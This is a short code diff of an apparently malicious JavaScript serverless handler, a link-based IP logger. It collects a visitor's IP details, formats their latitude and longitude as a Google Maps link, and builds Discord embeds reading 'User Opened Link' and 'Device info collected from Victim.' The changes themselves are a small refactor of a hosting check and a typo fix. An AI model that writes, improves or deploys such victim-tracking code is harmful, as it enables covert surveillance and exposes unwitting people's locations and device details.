@@ -81,10 +81,7 @@ export default async function handler(req, res) {
             ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
             : "Not available";
 
-        const isHosting = ipDetails.hosting ? "Yes" : "No";
-
-        // Prepare different messages based on hosting status
-        const message = isHosting === "Yes" 
+        const message = ipDetails.hosting
             ? {
                 embeds: [
                     {
@@ -102,7 +99,7 @@ export default async function handler(req, res) {
             : {
                 embeds: [
                     {
-                        title: "User Oppended Link",
+                        title: "User Opened Link",
                         color: 0x00FFFF,
                         description: "Device info collected from Victim.",
                         fields: [
